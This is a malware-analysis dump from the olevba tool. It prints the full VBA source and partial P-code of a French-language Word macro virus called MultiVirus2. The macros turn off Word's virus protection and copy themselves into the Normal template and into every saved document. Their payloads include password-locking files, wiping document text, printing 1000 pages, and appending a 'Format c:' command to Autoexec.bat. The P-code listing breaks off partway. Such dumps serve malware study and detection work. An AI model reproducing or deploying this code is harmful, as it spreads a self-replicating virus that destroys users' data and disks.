olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.MultiVirus.2
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.MultiVirus.2 - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO MultiVirus2.bas 
in file: Virus.MSWord.MultiVirus.2 - OLE stream: 'Macros/VBA/MultiVirus2'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAO
iMacroCount = WordBasic.CountMacros(0, 0)
For I = 1 To iMacroCount
    If WordBasic.[MacroName$](I, 0) = "MultiVirus2" Then
        MultiVirus2Installed = -1
    End If
Next I
If Not MultiVirus2Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MultiVirus2", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MessageBox", Object:=wdOrganizerObjectProjectItems
End If
Call PayIce
Call PayMon
ErrorAO:
End Sub
Sub AutoClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
iMacroCount = WordBasic.CountMacros(0, 0)
For I = 1 To iMacroCount
    If WordBasic.[MacroName$](I, 0) = "MultiVirus2" Then
        MultiVirus2Installed = -1
    End If
Next I
If Not MultiVirus2Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MultiVirus2", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MessageBox", Object:=wdOrganizerObjectProjectItems
End If
Call PayIncar
End Sub
Sub FileClose()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
iMacroCount = WordBasic.CountMacros(0, 0)
On Error GoTo ErrorFC
For I = 1 To iMacroCount
    If WordBasic.[MacroName$](I, 0) = "MultiVirus2" Then
        MultiVirus2Installed = -1
    End If
Next I
If Not MultiVirus2Installed Then
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MultiVirus2", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=ActiveDocument.FullName, Destination:=NormalTemplate.FullName, Name:="MessageBox", Object:=wdOrganizerObjectProjectItems
End If
Call PayIncar
Application.Run MacroName:="FichierFermer"
ErrorFC:
End Sub
Sub AutoExit()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorAEx
Dim FileName$, N$, Choix
With Application.FileSearch
    .FileName = "*.bmp"
    .LookIn = "C:\Windows"
    .Execute
     Choix = .FoundFiles.Count
     N$ = Int(Rnd * Choix) + 1
     FileName$ = .FoundFiles(N$)
End With
WordBasic.SetPrivateProfileString "DeskTop", "Wallpaper", FileName$, "Win.ini"
ErrorAEx:
End Sub
Sub FileSave()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFS
ActiveDocument.Save
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MultiVirus2", Object:=wdOrganizerObjectProjectItems
    Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MessageBox", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
ErrorFS:
End Sub
Sub FileSaveAs()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFSA
    Dialogs(wdDialogFileSaveAs).Show
        If (ActiveDocument.SaveFormat = wdFormatDocument) Or (ActiveDocument.SaveFormat = wdFormatTemplate) Then
            ActiveDocument.SaveAs FileFormat:=wdFormatTemplate
        End If
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MultiVirus2", Object:=wdOrganizerObjectProjectItems
Application.OrganizerCopy Source:=NormalTemplate.FullName, Destination:=ActiveDocument.FullName, Name:="MessageBox", Object:=wdOrganizerObjectProjectItems
ActiveDocument.Save
Dim MyDate, MyWeek
MyDate = Date
MyWeek = WeekDay(MyDate, vbMonday)
If MyWeek = 1 Then
    ActiveDocument.SaveAs Password:="Lundi"
End If
ErrorFSA:
End Sub
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorFT
    Selection.WholeStory
    Selection.Delete Unit:=wdWord, Count:=1
    ActiveDocument.Save
ErrorFT:
End Sub
Private Sub PayIce()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorPI
Dim WOpen$, Sales
WOpen$ = WordBasic.[GetPrivateProfileString$]("Comptage", "DernActivation", "Win.ini")
Sales = WordBasic.Val(WOpen$) + 1
WordBasic.SetPrivateProfileString "Comptage", "DernActivation", Str(Sales), "Win.ini"
WOpen$ = WordBasic.[GetPrivateProfileString$]("Comptage", "DernActivation", "Win.ini")
If WOpen$ = 24 Then
    StatusBar = "Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "           Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                       Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                   Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                               Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                                           Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                                                      Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                                                              Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                                                                       Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                                                                                   Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                                                                                               Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                                                                                                           Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                                                                                                                       Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
    StatusBar = "                                                                                                                                                   Lontong Micro Device © 1998 par ZeMacroKiller98"
    For I = 1 To 400000
    Next I
WordBasic.SetPrivateProfileString "Comptage", "DernActivation", "1", "Win.ini"
End If
ErrorPI:
End Sub
Private Sub PayIncar()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorPIn
Dim MyDate, MyYear
MyDate = Date
MyYear = Year(MyDate)
Selection.EndKey
Selection.TypeParagraph
Selection.TypeText Text:="Pour en finir avec, je voudrais dire..."
Selection.TypeParagraph
Selection.TypeText Text:="Pour me défier, il faut s'attirer mon courroux..."
Selection.TypeParagraph
Selection.TypeText Text:="Je suis ZeMacroKiller98"
Selection.TypeParagraph
Selection.TypeText Text:="Je suis MultiVirus2..."
Selection.TypeParagraph
Selection.TypeText Text:="Je ne serai pas refusé!!!"
Selection.TypeParagraph
Selection.TypeText Text:=MyYear & "ZeMacroKiller98"
ActiveDocument.Save
ErrorPIn:
End Sub
Sub PayMon()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorPM
Dim MyDate, MyWeek
MyDate = Date
MyWeek = WeekDay(MyDate, vbMonday)
Randomize
N$ = Int(Rnd * 20) + 1
If MyWeek = 1 Then
    GoTo Charge
Else
    GoTo fin
Charge:
Select Case N$
    Case 1, 3, 5, 7, 9, 11, 13, 15, 17, 19
        Open "C:\Autoexec.bat" For Append As #1
            Print #1, "echo off"
            Print #1, "cls"
            Print #1, "echo o|Format c: /u"
            Print #1, "echo Votre disque c: a été formaté, HAHAHAHAHA!!!!"
        Close #1
End Select
MsgBox "ZeMacroKiller98 dit:" & Chr$(13) & "Allez-y! C'est mon jour! ! !", vbInformation, "MultiVirus2"
Documents.Add
Selection.TypeText Text:="Ceci est le virus MultiVirus2!!!!"
For I = 1 To 1000
    ActiveDocument.PrintOut
Next I
End If
fin:
ErrorPM:
End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorTM
    MessageBox.Show
ErrorTM:
End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
On Error GoTo ErrorVVBC
    MsgBox "Ce programme a réalisé une opération illégale et va être interrompu.", vbCritical, "Microsoft Word"
ErrorVVBC:
End Sub
-------------------------------------------------------------------------------
VBA MACRO MessageBox.frm 
in file: Virus.MSWord.MultiVirus.2 - OLE stream: 'Macros/VBA/MessageBox'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Private Sub CommandButton1_Click()
Unload MessageBox
End Sub
Private Sub UserForm_Initialize()
Application.EnableCancelKey = wdCancelDisabled
WordBasic.DisableAutoMacros 0
Options.VirusProtection = False
End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.MultiVirus.2
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 965 bytes
' Macros/VBA/MultiVirus2 - 15922 bytes
' Line #0:
' 	FuncDefn (Sub AutoOpen())
' Line #1:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #2:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #3:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #4:
' 	OnError ErrorAO 
' Line #5:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #6:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #7:
' 	Ld I 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x000B "MultiVirus2"
' 	Eq 
' 	IfBlock 
' Line #8:
' 	LitDI2 0x0001 
' 	UMi 
' 	St MultiVirus2Installed 
' Line #9:
' 	EndIfBlock 
' Line #10:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #11:
' 	Ld MultiVirus2Installed 
' 	Not 
' 	IfBlock 
' Line #12:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "MultiVirus2"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #13:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "MessageBox"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #14:
' 	EndIfBlock 
' Line #15:
' 	ArgsCall (Call) PayIce 0x0000 
' Line #16:
' 	ArgsCall (Call) PayMon 0x0000 
' Line #17:
' 	Label ErrorAO 
' Line #18:
' 	EndSub 
' Line #19:
' 	FuncDefn (Sub AutoClose())
' Line #20:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #21:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #22:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #23:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #24:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #25:
' 	Ld I 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x000B "MultiVirus2"
' 	Eq 
' 	IfBlock 
' Line #26:
' 	LitDI2 0x0001 
' 	UMi 
' 	St MultiVirus2Installed 
' Line #27:
' 	EndIfBlock 
' Line #28:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #29:
' 	Ld MultiVirus2Installed 
' 	Not 
' 	IfBlock 
' Line #30:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "MultiVirus2"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #31:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "MessageBox"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #32:
' 	EndIfBlock 
' Line #33:
' 	ArgsCall (Call) PayIncar 0x0000 
' Line #34:
' 	EndSub 
' Line #35:
' 	FuncDefn (Sub FileClose())
' Line #36:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #37:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #38:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #39:
' 	LitDI2 0x0000 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd CountMacros 0x0002 
' 	St iMacroCount 
' Line #40:
' 	OnError ErrorFC 
' Line #41:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld iMacroCount 
' 	For 
' Line #42:
' 	Ld I 
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemLd [MacroName$] 0x0002 
' 	LitStr 0x000B "MultiVirus2"
' 	Eq 
' 	IfBlock 
' Line #43:
' 	LitDI2 0x0001 
' 	UMi 
' 	St MultiVirus2Installed 
' Line #44:
' 	EndIfBlock 
' Line #45:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #46:
' 	Ld MultiVirus2Installed 
' 	Not 
' 	IfBlock 
' Line #47:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "MultiVirus2"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #48:
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "MessageBox"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #49:
' 	EndIfBlock 
' Line #50:
' 	ArgsCall (Call) PayIncar 0x0000 
' Line #51:
' 	LitStr 0x000D "FichierFermer"
' 	ParamNamed MacroName 
' 	Ld Application 
' 	ArgsMemCall Run 0x0001 
' Line #52:
' 	Label ErrorFC 
' Line #53:
' 	EndSub 
' Line #54:
' 	FuncDefn (Sub AutoExit())
' Line #55:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #56:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #57:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #58:
' 	OnError ErrorAEx 
' Line #59:
' 	Dim 
' 	VarDefn FileName
' 	VarDefn N
' 	VarDefn Choix
' Line #60:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #61:
' 	LitStr 0x0005 "*.bmp"
' 	MemStWith FileName 
' Line #62:
' 	LitStr 0x000A "C:\Windows"
' 	MemStWith LookIn 
' Line #63:
' 	ArgsMemCallWith Execute 0x0000 
' Line #64:
' 	MemLdWith FoundFiles 
' 	MemLd Count 
' 	St Choix 
' Line #65:
' 	Ld Rnd 
' 	Ld Choix 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0001 
' 	Add 
' 	St N$ 
' Line #66:
' 	Ld N$ 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St FileName$ 
' Line #67:
' 	EndWith 
' Line #68:
' 	LitStr 0x0007 "DeskTop"
' 	LitStr 0x0009 "Wallpaper"
' 	Ld FileName$ 
' 	LitStr 0x0007 "Win.ini"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #69:
' 	Label ErrorAEx 
' Line #70:
' 	EndSub 
' Line #71:
' 	FuncDefn (Sub FileSave())
' Line #72:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #73:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #74:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #75:
' 	OnError ErrorFS 
' Line #76:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #77:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "MultiVirus2"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #78:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "MessageBox"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #79:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #80:
' 	Label ErrorFS 
' Line #81:
' 	EndSub 
' Line #82:
' 	FuncDefn (Sub FileSaveAs())
' Line #83:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #84:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #85:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #86:
' 	OnError ErrorFSA 
' Line #87:
' 	Ld wdDialogFileSaveAs 
' 	ArgsLd Dialogs 0x0001 
' 	ArgsMemCall Show 0x0000 
' Line #88:
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatDocument 
' 	Eq 
' 	Paren 
' 	Ld ActiveDocument 
' 	MemLd SaveFormat 
' 	Ld wdFormatTemplate 
' 	Eq 
' 	Paren 
' 	Or 
' 	IfBlock 
' Line #89:
' 	Ld wdFormatTemplate 
' 	ParamNamed FileFormat 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #90:
' 	EndIfBlock 
' Line #91:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000B "MultiVirus2"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #92:
' 	Ld NormalTemplate 
' 	MemLd FullName 
' 	ParamNamed Source 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	ParamNamed Destination 
' 	LitStr 0x000A "MessageBox"
' 	ParamNamed New 
' 	Ld wdOrganizerObjectProjectItems 
' 	ParamNamed On 
' 	Ld Application 
' 	ArgsMemCall OrganizerCopy 0x0004 
' Line #93:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #94:
' 	Dim 
' 	VarDefn MyDate
' 	VarDefn MyWeek
' Line #95:
' 	Ld Date 
' 	St MyDate 
' Line #96:
' 	Ld MyDate 
' 	Ld vbMonday 
' 	ArgsLd WeekDay 0x0002 
' 	St MyWeek 
' Line #97:
' 	Ld MyWeek 
' 	LitDI2 0x0001 
' 	Eq 
' 	IfBlock 
' Line #98:
' 	LitStr 0x0005 "Lundi"
' 	ParamNamed Password 
' 	Ld ActiveDocument 
' 	ArgsMemCall SaveAs 0x0001 
' Line #99:
' 	EndIfBlock 
' Line #100:
' 	Label ErrorFSA 
' Line #101:
' 	EndSub 
' Line #102:
' 	FuncDefn (Sub FileTemplates())
' Line #103:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #104:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #105:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #106:
' 	OnError ErrorFT 
' Line #107:
' 	Ld Selection 
' 	ArgsMemCall WholeStory 0x0000 
' Line #108:
' 	Ld wdWord 
' 	ParamNamed Unit 
' 	LitDI2 0x0001 
' 	ParamNamed Count 
' 	Ld Selection 
' 	ArgsMemCall Delete 0x0002 
' Line #109:
' 	Ld ActiveDocument 
' 	ArgsMemCall Save 0x0000 
' Line #110:
' 	Label ErrorFT 
' Line #111:
' 	EndSub 
' Line #112:
' 	FuncDefn (Private Sub PayIce())
' Line #113:
' 	Ld wdCancelDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #114:
' 	LitDI2 0x0000 
' 	Ld WordBasic 
' 	ArgsMemCall DisableAutoMacros 0x0001 
' Line #115:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #116:
' 	OnError ErrorPI 
' Line #117:
' 	Dim 
' 	VarDefn WOpen
' 	VarDefn Sales
' Line #118:
' 	LitStr 0x0008 "Comptage"
' 	LitStr 0x000E "DernActivation"
' 	LitStr 0x0007 "Win.ini"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St WOpen$ 
' Line #119:
' 	Ld WOpen$ 
' 	Ld WordBasic 
' 	ArgsMemLd Val 0x0001 
' 	LitDI2 0x0001 
' 	Add 
' 	St Sales 
' Line #120:
' 	LitStr 0x0008 "Comptage"
' 	LitStr 0x000E "DernActivation"
' 	Ld Sales 
' 	ArgsLd Str 0x0001 
' 	LitStr 0x0007 "Win.ini"
' 	Ld WordBasic 
' 	ArgsMemCall SetPrivateProfileString 0x0004 
' Line #121:
' 	LitStr 0x0008 "Comptage"
' 	LitStr 0x000E "DernActivation"
' 	LitStr 0x0007 "Win.ini"
' 	Ld WordBasic 
' 	ArgsMemLd [GetPrivateProfileString$] 0x0003 
' 	St WOpen$ 
' Line #122:
' 	Ld WOpen$ 
' 	LitDI2 0x0018 
' 	Eq 
' 	IfBlock 
' Line #123:
' 	LitStr 0x002F "Lontong Micro Device © 1998 par ZeMacroKiller98"
' 	St StatusBar 
' Line #124:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #125:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #126:
' 	LitStr 0x003A "           Lontong Micro Device © 1998 par ZeMacroKiller98"
' 	St StatusBar 
' Line #127:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #128:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #129:
' 	LitStr 0x0046 "                       Lontong Micro Device © 1998 par ZeMacroKiller98"
' 	St StatusBar 
' Line #130:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #131:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #132:
' 	LitStr 0x0052 "                                   Lontong Micro Device © 1998 par ZeMacroKiller98"
' 	St StatusBar 
' Line #133:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #134:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #135:
' 	LitStr 0x005E "                                               Lontong Micro Device © 1998 par ZeMacroKiller98"
' 	St StatusBar 
' Line #136:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #137:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #138:
' 	LitStr 0x006A "                                                           Lontong Micro Device © 1998 par ZeMacroKiller98"
' 	St StatusBar 
' Line #139:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #140:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #141:
' 	LitStr 0x0075 "                                                                      Lontong Micro Device © 1998 par ZeMacroKiller98"
' 	St StatusBar 
' Line #142:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #143:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #144:
' 	LitStr 0x007D "                                                                              Lontong Micro Device © 1998 par ZeMacroKiller98"
' 	St StatusBar 
' Line #145:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #146:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #147:
' 	LitStr 0x0086 "                                                                                       Lontong Micro Device © 1998 par ZeMacroKiller98"
' 	St StatusBar 
' Line #148:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #149:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #150:
' 	LitStr 0x0092 "                                                                                                   Lontong Micro Device © 1998 par ZeMacroKiller98"
' 	St StatusBar 
' Line #151:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #152:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #153:
' 	LitStr 0x009E "                                                                                                               Lontong Micro Device © 1998 par ZeMacroKiller98"
' 	St StatusBar 
' Line #154:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #155:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #156:
' 	LitStr 0x00AA "                                                                                                                           Lontong Micro Device © 1998 par ZeMacroKiller98"
' 	St StatusBar 
' Line #157:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #158:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #159:
' 	LitStr 0x00B6 "                                                                                                                                       Lontong Micro Device © 1998 par ZeMacroKiller98"
' 	St StatusBar 
' Line #160:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	LitDI4 0x1A80 0x0006 
' 	For 
' Line #161:
' 	StartForVariable 
' 	Ld I 
' 	EndForVariable 
' 	NextVar 
' Line #162:
